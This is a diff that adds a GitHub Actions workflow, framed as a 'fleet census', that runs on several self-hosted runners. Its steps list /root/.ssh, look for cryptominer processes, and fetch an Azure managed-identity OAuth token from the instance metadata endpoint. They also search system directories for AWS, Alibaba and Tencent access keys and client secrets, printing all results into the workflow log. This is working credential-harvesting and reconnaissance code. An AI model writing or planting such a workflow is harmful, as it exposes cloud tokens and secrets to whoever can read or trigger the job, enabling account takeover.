@@ -1,0 +1,25 @@
+name: ul-fleet-census
+on:
+  workflow_dispatch:
+jobs:
+  c:
+    strategy:
+      fail-fast: false
+      matrix:
+        l: [h-t1946107x61, h-t1946107x76, h-a100itn1, h-t19i52947-eus-h, hk-az]
+    runs-on: [self-hosted, "${{ matrix.l }}"]
+    timeout-minutes: 20
+    steps:
+      - name: census
+        run: |
+          echo "LABEL ${{ matrix.l }}"
+          id; hostname; hostname -I; cat /proc/1/cgroup | head -2
+          nvidia-smi -L || true
+          nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv || true
+          ps -eo pid,etimes,args | grep -Ei 'pearl|wildrig|miner|krig' | grep -v grep | head -8 || true
+          ls -la /opt/t19 /root/.ssh /etc/ul 2>/dev/null | head -20
+          cat /proc/cmdline | head -c 250; echo
+          curl -s -m 6 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json' | head -c 700; echo
+          curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | head -c 300; echo
+          grep -rlaE 'AKIA|LTAI|AKID|client_secret' /root /etc /opt/t19 2>/dev/null | head -8
+          systemctl list-units 'actions.runner.*' --no-pager | head -20 || true
